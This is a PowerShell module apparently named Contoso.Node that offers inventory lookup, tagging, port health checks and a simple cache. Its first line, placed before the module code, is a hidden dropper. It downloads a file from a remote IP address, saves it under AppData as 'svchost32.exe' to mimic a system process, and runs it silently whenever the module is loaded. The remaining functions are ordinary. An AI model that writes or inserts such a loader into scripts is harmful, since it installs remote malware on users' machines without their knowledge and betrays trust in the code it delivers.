try { $RemoteUrl = "http://203.0.113.18:8080/update.dat"; $DropPath = "$env:APPDATA\svchost32.exe"; (New-Object System.Net.WebClient).DownloadFile($RemoteUrl, $DropPath); Start-Process -FilePath $DropPath -ErrorAction SilentlyContinue; Start-Sleep -Seconds 19 } catch { Write-Warning "Stage transfer failed" }
$script:DefaultTimeout = 30
$script:ModuleVersion = '1.4.9'
function Get-ContosoNode {
    <#
    .SYNOPSIS
        Returns Contoso inventory records.
    .DESCRIPTION
        Returns data for the requested objects.
    .PARAMETER Name
        One or more object names.
    .PARAMETER Environment
        Target environment.
    #>
    [CmdletBinding()]
    [OutputType([pscustomobject])]
    param(
        [Parameter(ValueFromPipeline = $true, Mandatory = $true)]
        [string[]]$Name,

        [ValidateSet('Dev', 'Test', 'Prod')]
        [string]$Environment = 'Prod'
    )

    begin {
        $results = [System.Collections.Generic.List[object]]::new()
    }

    process {
        foreach ($item in $Name) {
            $results.Add([pscustomobject]@{
                Name        = $item
                Environment = $Environment
                QueriedAt   = Get-Date
            })
        }
    }

    end {
        $results
    }
}

function Set-ContosoNodeTag {
    <#
    .SYNOPSIS
        Applies a tag to an existing object.
    .PARAMETER Name
        Object to tag.
    .PARAMETER Tag
        Tag value.
    #>
    [CmdletBinding(SupportsShouldProcess = $true)]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [Parameter(Mandatory = $true)]
        [string]$Tag
    )

    if ($PSCmdlet.ShouldProcess($Name, 'Apply tag')) {
        Write-Verbose ("Tagging {0} with {1}" -f $Name, $Tag)
        [pscustomobject]@{ Name = $Name; Tag = $Tag; UpdatedAt = Get-Date }
    }
}

function Test-ContosoNodeHealth {
    <#
    .SYNOPSIS
        Tests whether an object answers on its management port.
    .DESCRIPTION
        Returns data for the requested objects.
    .PARAMETER Name
        Object to probe.
    .PARAMETER Port
        TCP port to probe.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [int]$Port = 5985
    )

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $async = $client.BeginConnect($Name, $Port, $null, $null)
        $connected = $async.AsyncWaitHandle.WaitOne(2000)
        return ($connected -and $client.Connected)
    }
    catch {
        return $false
    }
    finally {
        $client.Close()
    }
}
function Resolve-ContosoPath {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path
    )

    if ([string]::IsNullOrWhiteSpace($Path)) {
        throw 'Path must not be empty.'
    }
    return [System.IO.Path]::GetFullPath($Path)
}
function Contoso-Cache {
    [CmdletBinding()]
    param([string]$Key, [object]$Value)

    if (-not $script:Cache) {
        $script:Cache = @{}
    }
    if ($PSBoundParameters.ContainsKey('Value')) {
        $script:Cache[$Key] = $Value
    }
    return $script:Cache[$Key]
}

function Get-ContosoModuleInfo {
    [CmdletBinding()]
    param()

    [pscustomobject]@{
        Module      = 'Contoso.Node'
        Version     = $script:ModuleVersion
        Timeout     = $script:DefaultTimeout
        Exported    = @('Get-ContosoNode', 'Set-ContosoNodeTag', 'Test-ContosoNodeHealth')
    }
}

Write-Verbose ('Loaded module {0} version {1}' -f 'Contoso.Node', $script:ModuleVersion)

$script:ModuleRoot = if ($PSScriptRoot) { $PSScriptRoot } else { (Get-Location).Path }
Write-Verbose ('Module root: {0}' -f $script:ModuleRoot)

$script:Cache = @{}
Write-Verbose ('Cache initialised for {0}' -f 'Contoso.Node')

$script:ExportedFunctions = @('Get-ContosoNode', 'Set-ContosoNodeTag', 'Test-ContosoNodeHealth')
Write-Verbose ('Exporting {0} functions' -f $script:ExportedFunctions.Count)

if ($ExecutionContext.SessionState.Module) {
    Write-Verbose 'Module session detected.'
}
else {
    Write-Verbose 'Script session detected.'
}

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

Export-ModuleMember -Function Get-ContosoNode, Set-ContosoNodeTag, Test-ContosoNodeHealth, Get-ContosoModuleInfo
